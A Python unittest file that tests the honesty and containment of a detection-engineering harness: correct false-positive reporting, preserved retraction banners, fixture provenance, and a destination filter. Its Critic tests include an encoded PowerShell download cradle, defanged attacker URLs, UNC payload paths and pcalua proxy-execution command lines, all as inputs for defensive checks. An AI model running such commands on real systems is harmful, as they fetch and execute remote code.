"""Honesty guards for the swarm harness.

Regression tests for the findings in docs/reviews/2026-09-10-swarm-harness-evaluation.md:
figures that were published without being measured, claims the code did not enforce, and
retraction text that a routine regeneration could silently delete.
"""

from __future__ import annotations

import ast
import base64
import ipaddress
import json

import re
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]

from tools.swarm.adapter import SwarmAdapter  # noqa: E402
from tools.swarm.critic import PERMITTED_ADDRESS_RANGES  # noqa: E402
from tools.swarm.cable_writer import CableWriter, _existing_index_rows, _rebuild_index  # noqa: E402
from tools.swarm.export_layer import MitreLayerExporter  # noqa: E402
from tools.swarm.models import BoundaryFinding, Variant  # noqa: E402
from tools.swarm.telemetry_replay import TelemetryReplayEngine  # noqa: E402

FIXTURES_DIR = ROOT / "tests" / "fixtures" / "telemetry"
SWARM_SRC = ROOT / "tools" / "swarm"

# Destinations permitted in harness sources. Three groups, each deliberate:
#   1. reserved-name hosts (RFC 2606 / RFC 6761): any "*.invalid" suffix
#   2. reserved IP literals: loopback, unspecified, link-local (IMDS modelling), RFC 5737
#   3. documentation / namespace references, never lure destinations
_RESERVED_HOST_SUFFIXES = (".invalid", ".example", ".test", ".localhost")
_ALLOWED_HOSTS = {
    "127.0.0.1",
    "localhost",
    "www.w3.org",          # XML namespace URI
    "schemas.microsoft.com",  # Windows event schema reference
    "attack.mitre.org",    # ATT&CK reference link in cable prose
}
_ALLOWED_IPS = {
    "0.0.0.0",
    "127.0.0.1",
    "169.254.169.254",  # cloud IMDS endpoint modelled on purpose
    "192.0.2.0",        # RFC 5737 TEST-NET-1
    "198.51.100.0",     # RFC 5737 TEST-NET-2
    "203.0.113.0",      # RFC 5737 TEST-NET-3
}
_ALLOWED_IP_PREFIXES = ("169.254.",)


class IndexRetractionBannerTests(unittest.TestCase):
    """The index rebuild must not delete content it does not own."""

    def test_rebuild_preserves_caution_banner_and_other_non_table_text(self):
        with tempfile.TemporaryDirectory() as tmp:
            index = Path(tmp) / "INDEX.md"
            index.write_text(
                "# Threat Intelligence Cables Index\n\n"
                "> [!CAUTION] Numerical corrections for STRAT-001/002/003 (2026-09-10): headline\n"
                "> aggregates are retracted. See [ERRATA](ERRATA-2026-09-10.md).\n\n"
                "| Cable ID | Date | Target Rule | Evasion Axis | Attack Primitive | Status | Document |\n"
                "|---|---|---|---|---|---|---|\n"
                "| [CABLE-2026-001](x.md) | 2026-09-03 | `r` | `a` | `m` | `x` | [Read](x.md) |\n",
                encoding="utf-8",
            )
            rows = _existing_index_rows(index)
            rows.append("| [CABLE-2026-099](y.md) | 2026-09-10 | `r` | `a` | `m` | `x` | [Read](y.md) |")
            rebuilt = _rebuild_index(index, rows)

            self.assertIn("> [!CAUTION]", rebuilt)
            self.assertIn("retracted", rebuilt)
            self.assertIn("ERRATA-2026-09-10", rebuilt)
            self.assertIn("CABLE-2026-001", rebuilt)
            self.assertIn("CABLE-2026-099", rebuilt)

    def test_rebuild_on_missing_file_still_produces_a_catalogue(self):
        with tempfile.TemporaryDirectory() as tmp:
            index = Path(tmp) / "INDEX.md"
            rebuilt = _rebuild_index(
                index,
                ["| [CABLE-2026-001](x.md) | 2026-09-03 | `r` | `a` | `m` | `x` | [Read](x.md) |"],
            )
            self.assertIn("# Threat Intelligence Cables Index", rebuilt)
            self.assertIn("CABLE-2026-001", rebuilt)


class UnmeasuredRateTests(unittest.TestCase):
    """A false-positive rate is defined only over a benign corpus."""

    def test_attack_corpus_reports_no_fp_rate(self):
        report = TelemetryReplayEngine().replay_file(FIXTURES_DIR / "mordor_lsass_dump.jsonl")
        self.assertFalse(report.is_benign)
        self.assertIsNone(report.empirical_fp_rate)
        self.assertIsNone(report.wilson_ci_lower)
        md = report.to_markdown()
        fp_row = [ln for ln in md.splitlines() if "Empirical FP Rate" in ln][0]
        self.assertIn("n/a (not measured", fp_row)
        self.assertNotIn("PASS", fp_row)
        self.assertNotIn("0.00%", fp_row)

    def test_benign_corpus_still_reports_a_measured_rate(self):
        report = TelemetryReplayEngine().replay_file(
            FIXTURES_DIR / "benign_enterprise_workstation.jsonl", is_benign=True
        )
        self.assertEqual(report.empirical_fp_rate, 0.0)
        fp_row = [ln for ln in report.to_markdown().splitlines() if "Empirical FP Rate" in ln][0]
        self.assertIn("0.00%", fp_row)
        self.assertNotIn("n/a", fp_row)

    def test_report_does_not_claim_cryptographic_verification(self):
        report = TelemetryReplayEngine().replay_file(FIXTURES_DIR / "mordor_schtasks_persistence.jsonl")
        self.assertNotIn("Cryptographically verified", report.to_markdown())


class ExportLayerHonestyTests(unittest.TestCase):
    """Exported layers must not encode a withdrawn measurement as a constant."""

    def test_no_pinned_resilience_default(self):
        self.assertIsNone(MitreLayerExporter().pinned_resilience)

    def test_scores_stay_documentable_without_a_measurement(self):
        scored = {
            t["techniqueID"]: t["score"]
            for t in MitreLayerExporter().build_layer()["techniques"]
        }
        self.assertNotIn(73, set(scored.values()), "pinned 0.712 blend resurrected")


class DestinationContainmentTests(unittest.TestCase):
    """Every synthetic destination in the harness stays inside the reserved set.

    The published containment claim is only meaningful if it holds on every path that
    emits synthetic telemetry, not just the Critic-gated subset.
    """

    def test_no_non_reserved_destination_literals_in_swarm_sources(self):
        offenders = []
        for path in sorted(SWARM_SRC.rglob("*.py")):
            text = path.read_text(encoding="utf-8")
            for host in {m.group(1).lower() for m in re.finditer(r"https?://([A-Za-z0-9._\-]+)", text)}:
                if host in _ALLOWED_HOSTS or host.endswith(_RESERVED_HOST_SUFFIXES):
                    continue
                # An IP-form host (e.g. the modelled IMDS endpoint) is checked against the
                # same reserved-IP allowlist as bare literals.
                if host in _ALLOWED_IPS or host.startswith(_ALLOWED_IP_PREFIXES):
                    continue
                offenders.append(f"{path.name}: host {host}")
            for ip in {m.group(0) for m in re.finditer(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", text)}:
                if ip in _ALLOWED_IPS or ip.startswith(_ALLOWED_IP_PREFIXES):
                    continue
                # The Critic's declared policy table is the authority: any literal inside a
                # permitted (loopback/link-local/private/documentation) range is in scope for
                # local fixtures, and anything outside it is an offender.
                if any(ipaddress.ip_address(ip) in network for network in PERMITTED_ADDRESS_RANGES):
                    continue
                offenders.append(f"{path.name}: ip {ip}")
        self.assertEqual(
            offenders,
            [],
            "Non-reserved destinations found in harness sources: " + "; ".join(offenders),
        )


class PatchVerificationHonestyTests(unittest.TestCase):
    """A candidate patch that cannot detect the variant must yield no improvement claim."""

    def test_incapable_patch_reports_no_detection(self):
        adapter = SwarmAdapter()
        variant = Variant(
            id="var-fault-injection",
            target_type="sigma",
            axis="lolbin_proxy",
            mutation_name="fault_injection_no_match",
            description="Fault injection: a variant nothing in the corpus can match.",
            payload={
                "ParentImage": "explorer.exe",
                "Image": "definitely-not-a-real-binary.exe",
                "CommandLine": "no-match-marker",
            },
            cycle=1,
        )
        rule_path = adapter.rules_dir / "sigma" / "proc_creation_win_explorer_clickfix_execution.yml"
        verification = adapter._verify_patch(
            rule_path, rule_path.read_text(encoding="utf-8"), "sigma", variant
        )
        self.assertIsNone(verification["error"])
        self.assertFalse(verification["variant_detected_before"])
        self.assertFalse(verification["variant_detected_after"])
        self.assertEqual(verification["negative_fixtures_checked"], 0)

    def test_incomplete_payload_surfaces_an_error_instead_of_a_silent_miss(self):
        """A payload the evaluator cannot process must be reported, not quietly treated as a pass."""
        adapter = SwarmAdapter()
        variant = Variant(
            id="var-malformed",
            target_type="sigma",
            axis="lolbin_proxy",
            mutation_name="malformed_payload",
            description="Fault injection: payload missing the columns the analytic requires.",
            payload={"CommandLine": "pcalua.exe -a powershell.exe"},
            cycle=1,
        )
        rule_path = adapter.rules_dir / "sigma" / "proc_creation_win_explorer_clickfix_execution.yml"
        verification = adapter._verify_patch(
            rule_path, rule_path.read_text(encoding="utf-8"), "sigma", variant
        )
        # Either the analytic handles the payload (clean miss) or the error is reported -
        # what must not happen is a silent False with no provenance.
        if verification["error"] is None:
            self.assertFalse(verification["variant_detected_after"])
        else:
            self.assertIn("Error", verification["error"])

    def test_healed_cable_states_evidence_and_claims_no_resilience_delta(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            writer = CableWriter(cables_dir=Path(tmpdir))
            finding = BoundaryFinding(
                target_rule="proc_creation_win_explorer_clickfix_execution",
                target_type="sigma",
                cycle=1,
                variant_id="var-test",
                mutation_name="pcalua_proxy",
                axis="lolbin_proxy",
                detected=False,
                evasion_gap_found=True,
                root_cause="Explorer spawned pcalua.exe as an indirect execution proxy.",
                policy_recommendation="REC-SIGMA-006: Add pcalua.exe to monitored child images.",
                confidence="HIGH",
            )
            variant = Variant(
                id="var-test",
                target_type="sigma",
                axis="lolbin_proxy",
                mutation_name="pcalua_proxy",
                description="Test directive",
                payload={"Image": "pcalua.exe", "CommandLine": "pcalua.exe -a powershell.exe -c irm"},
                cycle=1,
            )
            cable_path = writer.write_cable(
                finding=finding,
                variant=variant,
                patch_diff="+ selection_proxy_img:",
                recommendation_id="REC-SIGMA-006",
                verification={
                    "variant_detected_before": False,
                    "variant_detected_after": True,
                    "negative_fixtures_checked": 7,
                    "negative_fixtures_matched": 0,
                },
            )
            text = cable_path.read_text(encoding="utf-8")

            # The cable reports what was measured...
            self.assertIn("variant_detected_before_patch: False", text)
            self.assertIn("variant_detected_after_patch: True", text)
            self.assertIn("negative_fixtures_checked: 7", text)
            self.assertIn("detected the evasion variant that the unpatched rule missed", text)
            # ...and claims no resilience delta or unsupported probability.
            self.assertNotIn("resilience", text.lower())
            self.assertNotIn("improved from", text)
            self.assertNotIn("probability", text.lower())
            self.assertNotIn("Autonomous", text)
            self.assertNotIn("Self-Healing", text)
            # Confidence is carried through from the finding rather than hardcoded.
            self.assertIn("confidence_level: HIGH", text)


# Vocabulary that advertises capabilities the harness does not implement. The word
# "autonomous" is legitimate when describing the studied agent-ecosystem threat, so it is
# banned in harness code only, not in the research notes about AI agents.
BANNED_CLAIM_VOCABULARY = (
    "adversarial swarm",
    "multi-agent",
    "self-healing",
    "self-evolving",
    "immune system",
    "ai-powered",
    "intelligence engine",
    "autonomousorchestrator",
)
BANNED_IN_HARNESS_CODE = ("autonomous",)

# Paragraphs that retract a claim are allowed to quote it, so long as they say so.
HISTORICAL_MARKERS = ("corrected 2026-09-10", "earlier revisions", "no longer used", "retracted")


class ClaimVocabularyTests(unittest.TestCase):
    """The harness must not advertise capabilities it does not implement."""

    def test_harness_does_not_advertise_unimplemented_capabilities(self):
        repo = Path(__file__).resolve().parents[1]
        harness = repo / "tools" / "swarm"
        files = [f for f in sorted(harness.rglob("*.py")) if "__pycache__" not in str(f)]
        files += [repo / "docs" / "swarm" / "architecture.md", repo / "README.md"]

        offenders = []
        for f in files:
            if not f.exists():
                continue
            low = f.read_text(encoding="utf-8", errors="ignore").lower()
            rel = f.relative_to(repo)
            for paragraph in re.split(r"\n\s*\n", low):
                # Retraction prose has to name what it retracts; only that paragraph is exempt.
                if any(m in paragraph for m in HISTORICAL_MARKERS):
                    continue
                for phrase in BANNED_CLAIM_VOCABULARY:
                    if phrase in paragraph:
                        offenders.append(f"{rel}: '{phrase}'")
                if f.suffix == ".py":
                    for phrase in BANNED_IN_HARNESS_CODE:
                        if phrase in paragraph:
                            offenders.append(f"{rel}: '{phrase}' (harness code)")

        self.assertEqual([], offenders, "banned claim vocabulary in: " + "; ".join(offenders))

    def test_no_role_is_documented_without_an_implementation(self):
        """A named role with no class behind it is a docstring fiction."""
        repo = Path(__file__).resolve().parents[1]
        note = (repo / "docs" / "swarm" / "architecture.md").read_text(encoding="utf-8")
        self.assertNotIn("Strategist", note)
        for module in ("craftsmen", "critic.py", "detectors.py", "analyst.py", "adapter.py"):
            self.assertTrue((repo / "tools" / "swarm" / module).exists(), module)

    def test_feedback_edges_are_either_read_or_documented_as_nominal(self):
        """If no craftsman consumes `feedback`, the architecture note must say so."""
        repo = Path(__file__).resolve().parents[1]
        craftsmen = repo / "tools" / "swarm" / "craftsmen"

        reads_feedback = False
        for f in sorted(craftsmen.glob("*.py")):
            tree = ast.parse(f.read_text(encoding="utf-8"))
            for node in ast.walk(tree):
                if not isinstance(node, ast.FunctionDef):
                    continue
                if "feedback" not in {a.arg for a in node.args.args}:
                    continue
                loads = {n.id for n in ast.walk(node) if isinstance(n, ast.Name) and isinstance(n.ctx, ast.Load)}
                if "feedback" in loads:
                    reads_feedback = True

        note = (repo / "docs" / "swarm" / "architecture.md").read_text(encoding="utf-8")
        if reads_feedback:
            self.fail("craftsmen now read `feedback`; the nominal-feedback limitation must be removed")
        self.assertIn("Craft-level feedback is not consumed", note)


class CriticDestinationPolicyTests(unittest.TestCase):
    """The Critic's accepted set must match the policy it declares, not drift from it."""

    def setUp(self):
        from tools.swarm.critic import SwarmCritic
        self.critic = SwarmCritic()

    def _issues(self, text):
        return self.critic._check_safety_boundaries(text)

    def test_declared_policy_table_matches_enforcement(self):
        permitted = [
            "http://127.0.0.1/x", "http://169.254.169.254/latest/meta-data/",
            "http://10.0.0.5/x", "http://192.168.1.10/x", "http://192.0.2.10/x",
            "http://203.0.113.10/x", "http://198.51.100.7/x",
            "http://payload.invalid/x", "http://host.example/x", "http://name.test/x",
        ]
        for text in permitted:
            self.assertEqual([], self._issues(text), f"should be permitted: {text}")

        rejected = [
            "http://8.8.8.8/x", "http://173.16.0.1/x", "http://1.1.1.1/x",
            "http://evil.com/x", "http://crypto-airdrop.top/x",
        ]
        for text in rejected:
            self.assertTrue(self._issues(text), f"should be rejected: {text}")

    def test_defanged_unc_and_encoded_destinations_are_checked(self):
        self.assertTrue(self._issues("hxxp://crypto-airdrop[.]top/payload"))
        self.assertTrue(self._issues("h**p://free-movies.xyz/a.exe"))
        self.assertTrue(self._issues(r"\\attacker-host.com\share\payload.exe"))
        encoded = base64.b64encode(b"IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/x.ps1')").decode()
        self.assertTrue(self._issues(f"powershell -enc {encoded}"), "base64-hidden destination")
        # Reserved hosts stay permitted in every form.
        self.assertEqual([], self._issues("hxxp://payload[.]invalid/x"))
        safe_encoded = base64.b64encode(b"http://payload.invalid/x.ps1").decode()
        self.assertEqual([], self._issues(f"powershell -enc {safe_encoded}"))

    def test_ip_finding_wording_matches_the_check(self):
        """A documentation range is non-reserved, not routable; the message must not say routable."""
        for text in ("192.0.2.99", "203.0.113.99"):
            self.assertEqual([], self._issues(text))


class LedgerDurabilityTests(unittest.TestCase):
    """An append failure must not silently desynchronise counters from the ledger."""

    def test_append_failure_marks_the_run_degraded(self):
        from tools.swarm.endurance_runner import EnduranceRunner

        class _FailingWriter:
            def append(self, record):
                raise OSError("disk full")

        class _Stub:
            run_id = "run-test"
            record_writer = _FailingWriter()

            def _ensure_writer(self):
                return self.record_writer

        stub = _Stub()
        EnduranceRunner._emit(stub, suite="test", kind="probe")
        self.assertTrue(getattr(stub, "ledger_degraded", False), "run must be marked degraded")
        self.assertIn("OSError", getattr(stub, "ledger_error", ""))


class FileSuffixDenylistTests(unittest.TestCase):
    """The UNC file-suffix denylist must never contain a string that is also a real TLD.

    A `.com` entry silently skipped every host under the most common TLD in existence, so the
    denylist is checked against the TLD overlap that caused it.
    """

    # Suffixes that are both plausible file extensions and real top-level domains.
    TLD_LOOKALIKES = (
        ".com", ".sh", ".py", ".ms", ".io", ".co", ".nu", ".app", ".dev", ".so", ".pl",
        ".rs", ".ai", ".cc", ".tv", ".me", ".it", ".in", ".to", ".gg", ".fm", ".pm", ".tf",
    )

    def test_denylist_contains_no_real_tld(self):
        from tools.swarm.critic import FILE_LIKE_SUFFIXES
        overlap = sorted(set(FILE_LIKE_SUFFIXES) & set(self.TLD_LOOKALIKES))
        self.assertEqual([], overlap, f"UNC denylist shadows real TLDs: {overlap}")

    def test_com_host_in_unc_form_is_still_a_destination(self):
        from tools.swarm.critic import SwarmCritic
        critic = SwarmCritic()
        issues = critic._check_safety_boundaries(r"\\cdn.attacker-cdn.com\share\payload.bin")
        self.assertTrue(issues, "a .com UNC host must still be checked")
        # ...and a local Windows path that merely contains dots is not a destination.
        self.assertEqual([], critic._check_safety_boundaries(
            "ParentImage C:\\Program Files\\nodejs\\npx.cmd"
        ))


class ReplayFalsePositiveNumeratorTests(unittest.TestCase):
    """A benign corpus that only trips a correlation chain still produced a false positive."""

    def test_correlation_chain_events_enter_the_false_positive_numerator(self):
        from tools.swarm.telemetry_replay import TelemetryReplayEngine

        corpus = (Path(__file__).resolve().parents[1] / "tests" / "fixtures" / "telemetry"
                  / "mordor_lsass_dump.jsonl")
        report = TelemetryReplayEngine().replay_file(corpus, is_benign=True)

        singles = {d["event_index"] for d in report.detections}
        correlation = {i for cd in report.correlation_detections for i in cd.get("selected_indices", [])}
        self.assertTrue(
            correlation - singles,
            "fixture must exercise the regression: events reached only by a correlation chain",
        )
        self.assertEqual(
            report.empirical_fp_rate,
            len(singles | correlation) / report.total_events,
            "the false-positive numerator must include correlation-selected events",
        )


class SiemCalibrationIndependenceTests(unittest.TestCase):
    """Correlation pairs must be independent: one observation per rule, one backend."""

    def test_calibration_pairs_one_observation_per_rule(self):
        from tools.swarm.siem_profiler import SiemQueryProfiler

        report = SiemQueryProfiler().benchmark_and_calibrate(corpus_size=50, repetitions=1)
        cal = report.empirical_calibration
        self.assertEqual(cal.get("backend_timed"), "sqlite")
        distinct_rules = len({p.rule_name for p in report.profiles})
        self.assertGreaterEqual(cal.get("observations", 0), 2, "too few pairs for a correlation")
        self.assertLessEqual(
            cal["observations"], distinct_rules,
            "more pairs than rules means a rule entered the correlation more than once",
        )
        self.assertLess(cal["observations"], len(report.profiles), "one pair per profile is the old defect")

    def test_empirical_latency_is_not_attached_to_other_backends(self):
        from tools.swarm.siem_profiler import SiemQueryProfiler

        report = SiemQueryProfiler().benchmark_and_calibrate(corpus_size=50, repetitions=1)
        for profile in report.profiles:
            if profile.empirical_ms is not None:
                self.assertEqual(profile.backend.lower(), "sqlite", profile.backend)


class SiemDriverAttributionTests(unittest.TestCase):
    """The driver claim must be counted from the elevated-cost profiles, not asserted."""

    @staticmethod
    def _report(**shared):
        from tools.swarm.siem_profiler import COSTLY, ProfilerReport, QueryProfile
        fields = dict(query="q", impact=COSTLY, complexity_score=90.0)
        fields.update(shared)
        report = ProfilerReport()
        report.profiles = [
            QueryProfile(rule_name=f"rule-{i}", backend="Splunk", **fields) for i in range(4)
        ]
        return report

    def test_no_dominant_driver_when_contributors_are_mixed(self):
        report = self._report(leading_wildcards=1, unanchored_regexes=0, nesting_depth=0, or_expansion_terms=0)
        # Only half the costly queries carry a leading wildcard.
        report.profiles[1].leading_wildcards = 0
        report.profiles[1].unanchored_regexes = 2
        report.profiles[3].leading_wildcards = 0
        report.profiles[3].unanchored_regexes = 2
        text = report._judgement()
        self.assertIn("No single contributor explains all of them", text)
        self.assertNotIn("present in all", text)

    def test_dominant_driver_is_named_when_it_covers_every_costly_query(self):
        report = self._report(leading_wildcards=1, unanchored_regexes=0, nesting_depth=0, or_expansion_terms=0)
        text = report._judgement()
        self.assertIn("present in all", text)
        self.assertIn("leading-wildcard matching", text)


class FixtureProvenanceTests(unittest.TestCase):
    """No fixture may be presented as upstream data without a reproducible derivation."""

    @property
    def datasets(self):
        manifest = json.loads(
            (Path(__file__).resolve().parents[1] / "tools" / "telemetry_manifest.json").read_text(encoding="utf-8")
        )
        return manifest["datasets"]

    def test_every_dataset_declares_provenance_and_derivation(self):
        for name, meta in self.datasets.items():
            self.assertIn(meta.get("provenance"), ("synthetic", "upstream"), f"{name}: provenance")
            self.assertTrue(meta.get("derivation"), f"{name}: derivation required")
            self.assertTrue(meta.get("sha256_note"), f"{name}: must say what its hash pins")

    def test_synthetic_fixtures_are_not_presented_as_captured_or_upstream(self):
        for name, meta in self.datasets.items():
            if meta.get("provenance") != "synthetic":
                continue
            text = f"{meta.get('title', '')} {meta.get('source', '')} {meta.get('derivation', '')}".lower()
            self.assertIn("synthetic", text, f"{name}: a synthetic fixture must say so")
            for claim in ("non-synthetic", "authentic"):
                self.assertNotIn(claim, text, f"{name}: synthetic fixture claims {claim!r}")

    def test_benign_baseline_disclaims_capture(self):
        """The benign fixture is authored here; it must say so rather than imply capture."""
        benign = self.datasets["benign_enterprise_workstation"]
        self.assertIn("not captured enterprise traffic", benign["derivation"])

    def test_no_document_calls_a_fixture_authentic(self):
        repo = Path(__file__).resolve().parents[1]
        offenders = []
        for rel in ("README.md", "docs/swarm/architecture.md", "tests/test_telemetry_replay.py",
                    "tools/acquire_telemetry.py"):
            path = repo / rel
            if not path.exists():
                continue
            for number, line in enumerate(path.read_text(encoding="utf-8", errors="ignore").splitlines(), 1):
                low = line.lower()
                if "authentic" in low and ("mordor" in low or "fixture" in low or "dataset" in low):
                    offenders.append(f"{rel}:{number}")
        self.assertEqual([], offenders, "fixture described as authentic: " + ", ".join(offenders))


class PatchEngineDriftTests(unittest.TestCase):
    """A rule that no longer matches the synthesizer's template must produce no patch, loudly."""

    @staticmethod
    def _finding(rule_name, axis="lolbin_proxy", mutation="pcalua_proxy"):
        from tools.swarm.models import BoundaryFinding, Variant
        variant = Variant(id="var-drift", target_type="sigma", axis=axis, mutation_name=mutation,
                          description="drift test", payload={"ParentImage": "explorer.exe"}, cycle=1)
        finding = BoundaryFinding(
            target_rule=rule_name, target_type="sigma", mutation_name=mutation, axis=axis,
            detected=False, evasion_gap_found=True, root_cause="proxy execution",
            policy_recommendation="add pcalua.exe", cycle=1, variant_id=variant.id, confidence="HIGH",
        )
        return finding, variant

    def test_drifted_rule_produces_no_patch_and_logs_an_error(self):
        from tools.swarm.adapter import SwarmAdapter
        adapter = SwarmAdapter()
        source = adapter.rules_dir / "sigma" / "proc_creation_win_explorer_clickfix_execution.yml"
        finding, variant = self._finding(source.name)
        with tempfile.TemporaryDirectory() as tmp:
            drifted = Path(tmp) / source.name
            drifted.write_text(
                source.read_text(encoding="utf-8").replace(
                    "    condition: selection_parent and (", "    condition: some_other_shape and ("
                ),
                encoding="utf-8", newline="\n",
            )
            with self.assertLogs("tools.swarm.adapter", level="ERROR") as logs:
                patched, rec_id, diff = adapter._synthesize_sigma_patch(drifted, finding, variant)
        self.assertIsNone(patched, "a drifted rule must not produce a patch")
        self.assertEqual("REC-SIGMA-006", rec_id)
        self.assertEqual("", diff)
        self.assertTrue(any("drift" in line.lower() for line in logs.output), logs.output)

    def test_intact_rule_logs_the_resolution_it_took(self):
        from tools.swarm.adapter import SwarmAdapter
        adapter = SwarmAdapter()
        source = adapter.rules_dir / "sigma" / "proc_creation_win_explorer_clickfix_execution.yml"
        finding, variant = self._finding(source.name)
        with self.assertLogs("tools.swarm.adapter", level="INFO") as logs:
            patched, rec_id, diff = adapter._synthesize_sigma_patch(source, finding, variant)
        self.assertIsNotNone(patched)
        self.assertEqual("REC-SIGMA-006", rec_id)
        self.assertTrue(any("Synthesized" in line for line in logs.output), logs.output)

    def test_unmapped_finding_reports_that_no_path_matched(self):
        from tools.swarm.adapter import SwarmAdapter
        adapter = SwarmAdapter()
        source = adapter.rules_dir / "sigma" / "proc_creation_win_explorer_clickfix_execution.yml"
        finding, variant = self._finding(source.name, axis="unmapped_axis", mutation="nothing_matches_this")
        with self.assertLogs("tools.swarm.adapter", level="WARNING") as logs:
            patched, rec_id, diff = adapter._synthesize_sigma_patch(source, finding, variant)
        self.assertIsNone(patched)
        self.assertEqual("REC-SIGMA-GENERIC", rec_id)
        self.assertTrue(any("No synthesis path matched" in line for line in logs.output), logs.output)


class DeterminismTests(unittest.TestCase):
    """The same seed and parameters must reproduce the same probe sequence."""

    def test_seeded_runs_produce_identical_probe_ids(self):
        from tools.swarm.endurance_runner import DEFAULT_SEED, EnduranceRunner
        from tools.swarm.records import load_records

        def probe_ids(seed):
            with tempfile.TemporaryDirectory() as tmp:
                results = Path(tmp)
                with EnduranceRunner(pace_seconds=0.0, serve_workbench=False,
                                     results_dir=results, seed=seed) as runner:
                    for _ in range(3):
                        runner._run_lolbin_proxy_sparring()
                return [row.get("probe_id") for row in load_records(results) if row.get("probe_id")]

        first, second = probe_ids(20260910), probe_ids(20260910)
        self.assertEqual(first, second, "same seed must yield the same probe ids")
        self.assertEqual(3, len(first))

    def test_default_seed_is_recorded_for_reproduction(self):
        from tools.swarm.endurance_runner import DEFAULT_SEED, EnduranceRunner

        with tempfile.TemporaryDirectory() as tmp:
            # The context manager matters on Windows: a leaked log FileHandler keeps the run
            # log locked and the temp dir cannot be cleaned up (WinError 32).
            with EnduranceRunner(pace_seconds=0.0, serve_workbench=False,
                                 results_dir=Path(tmp)) as runner:
                self.assertEqual(DEFAULT_SEED, runner.seed)

    def test_probe_ids_are_content_derived_not_random(self):
        from tools.swarm.endurance_runner import EnduranceRunner
        from tools.swarm.records import load_records

        with tempfile.TemporaryDirectory() as tmp:
            with EnduranceRunner(pace_seconds=0.0, serve_workbench=False,
                                 results_dir=Path(tmp)) as runner:
                for _ in range(4):
                    runner._run_lolbin_proxy_sparring()
            probe_ids = [row["probe_id"] for row in load_records(Path(tmp)) if row.get("probe_id")]

        self.assertTrue(probe_ids)
        for probe_id in probe_ids:
            self.assertRegex(probe_id, r"^proc-[0-9a-f]{8}$")


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
